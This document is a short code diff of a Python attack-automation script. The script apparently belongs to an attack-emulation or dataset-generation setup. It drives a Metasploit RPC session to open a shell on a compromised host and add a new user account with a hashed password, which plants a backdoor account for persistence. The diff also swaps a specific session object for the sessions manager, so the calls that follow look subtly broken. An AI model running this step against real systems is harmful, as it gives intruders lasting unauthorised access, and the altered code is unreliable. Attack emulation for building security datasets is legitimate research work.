@@ -20,12 +20,12 @@ def main(argv):
     client = MsfRpcClient('kali')
 
 
-    time.sleep(2)
+    time.sleep(60)
     output_time_file_start = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
 
-    shell = client.sessions.session('2')
+    shell = client.sessions
     shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
     # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
     shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
